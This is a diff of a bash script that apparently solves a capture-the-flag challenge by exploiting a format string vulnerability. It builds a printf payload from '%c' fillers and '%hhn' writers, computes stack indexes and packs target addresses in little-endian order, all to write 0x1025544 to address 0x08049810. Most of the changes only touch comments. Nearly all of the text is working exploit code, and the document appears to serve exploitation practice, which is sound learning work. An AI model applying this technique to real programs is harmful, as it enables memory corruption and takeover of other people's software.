@@ -10,7 +10,7 @@ hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
 # Helper function, "compute '16 - 4'" gives "12"
 compute() { echo "$1" | bc | tr -d '\n' ; }
 
-# We have to write '0x1025544' at the address 0x08049810 to get the flag
+# We have to write '0x1025544' at the address '0x08049810' to get the flag
 # The program use 'printf' with the input as a format string
 # We can use the '%n' conversion specifier to write a value to memory
 # We print 'k' characters, then '%i$hhn'
@@ -28,7 +28,7 @@ VALUE_2="02"
 VALUE_3="01"
 
 # We compute the indexes for the different addresses
-# The first byte address is written at (buffer + 256)
+# The first byte address is written at '(buffer + 256)'
 # Therefore, the stack index for the 'i' byte address is '(buffer + 256 - %esp)/4 + i'
 BUFFER_OFFSET_TO_ESP=48
 ADDRESSES_OFFSET_TO_ESP="$(compute "${BUFFER_OFFSET_TO_ESP} + 256")"
@@ -38,8 +38,6 @@ PRINTF_WRITER_2_INDEX="$(compute "${ADDRESSES_OFFSET_TO_ESP} / 4 + 2")"
 PRINTF_WRITER_3_INDEX="$(compute "${ADDRESSES_OFFSET_TO_ESP} / 4 + 3")"
 
 # We print the different values, interlaced with the writers
-# We don't need to print the filler for VALUE_3 since we already wrote 16 bytes
-# PRINTF_VALUE_3_FILLER="%$(compute "${VALUE_3} - ${PRINTF_ADDRESSES_SIZE}")c"
 PRINTF_VALUE_3_FILLER="%${VALUE_3}c"
 PRINTF_WRITER_3="%${PRINTF_WRITER_3_INDEX}\$hhn"
 PRINTF_VALUE_2_FILLER="%$(compute "${VALUE_2} - ${VALUE_3}")c"
@@ -55,7 +53,7 @@ PRINTF_PAYLOAD=\
 "${PRINTF_VALUE_1_FILLER}${PRINTF_WRITER_1}"
 PRINTF_PAYLOAD_SIZE=$(echo -n "${PRINTF_PAYLOAD}" | wc -c)
 
-# We print the addresses to the bytes of '0x08049810' at (buffer + 256)
+# We print the addresses to the bytes of '0x08049810' at '(buffer + 256)'
 PRINTF_ADDRESSES_ALIGNMENT_SIZE="$(compute "256 - ${PRINTF_PAYLOAD_SIZE}")"
 PRINTF_ADDRESSES_ALIGNMENT="$(put ${PRINTF_ADDRESSES_ALIGNMENT_SIZE} "A")"
 PRINTF_ADDRESS_0="$(hex_little_endian ${ADDRESS_0})"
